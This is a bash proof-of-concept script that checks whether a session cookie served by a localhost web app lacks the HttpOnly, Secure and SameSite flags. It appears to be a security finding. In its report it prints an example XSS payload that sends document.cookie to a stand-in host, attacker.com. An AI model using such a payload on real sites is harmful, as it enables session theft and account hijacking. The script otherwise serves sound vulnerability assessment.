#!/bin/bash

# POC: Missing HttpOnly Flag on Session Cookie
# This script demonstrates that the session cookie lacks the HttpOnly flag,
# making it vulnerable to JavaScript-based session hijacking via XSS attacks.

TARGET_URL="http://localhost:5000/list"

echo "=========================================="
echo "POC: Missing HttpOnly Flag on Session Cookie"
echo "=========================================="
echo ""
echo "Target: $TARGET_URL"
echo ""

# Make request and capture all headers
echo "[*] Sending HTTP GET request to retrieve session cookie..."
RESPONSE=$(curl -v "$TARGET_URL" 2>&1)

echo ""
echo "[*] Analyzing Set-Cookie headers..."
echo ""

# Extract Set-Cookie header
SET_COOKIE=$(echo "$RESPONSE" | grep -i "Set-Cookie:" | head -1)

if [ -z "$SET_COOKIE" ]; then
    echo "[-] ERROR: No Set-Cookie header found in response"
    exit 1
fi

echo "[+] Set-Cookie Header Found:"
echo "    $SET_COOKIE"
echo ""

# Check for HttpOnly flag
if echo "$SET_COOKIE" | grep -iq "HttpOnly"; then
    echo "[-] HttpOnly flag IS present (Secure)"
    HTTPONLY_PRESENT=true
else
    echo "[+] VULNERABILITY: HttpOnly flag is MISSING"
    HTTPONLY_PRESENT=false
fi

# Check for Secure flag
if echo "$SET_COOKIE" | grep -iq "Secure"; then
    echo "[-] Secure flag IS present"
    SECURE_PRESENT=true
else
    echo "[+] Secure flag is MISSING"
    SECURE_PRESENT=false
fi

# Check for SameSite flag
if echo "$SET_COOKIE" | grep -iq "SameSite"; then
    echo "[-] SameSite flag IS present"
    SAMESITE_PRESENT=true
else
    echo "[+] SameSite flag is MISSING"
    SAMESITE_PRESENT=false
fi

echo ""
echo "=========================================="
echo "VULNERABILITY ASSESSMENT"
echo "=========================================="
echo ""

# Extract cookie value and path
COOKIE_VALUE=$(echo "$SET_COOKIE" | sed -n 's/.*user=\([^;]*\).*/\1/p')
COOKIE_PATH=$(echo "$SET_COOKIE" | grep -oP 'Path=\K[^;]*')

echo "Cookie Name: user"
echo "Cookie Value: $COOKIE_VALUE"
echo "Cookie Path: $COOKIE_PATH"
echo ""

if [ "$HTTPONLY_PRESENT" = false ]; then
    echo "[!] CRITICAL: The session cookie is accessible to JavaScript code"
    echo "[!] An attacker could use XSS to steal this cookie with:"
    echo "    javascript:document.location='http://attacker.com/steal?c='+document.cookie"
    echo ""
    echo "[!] Impact: Session hijacking possible if any XSS vulnerability exists"
    echo ""
    exit 0
else
    echo "[-] HttpOnly flag is properly set - cookie is protected from JavaScript access"
    exit 1
fi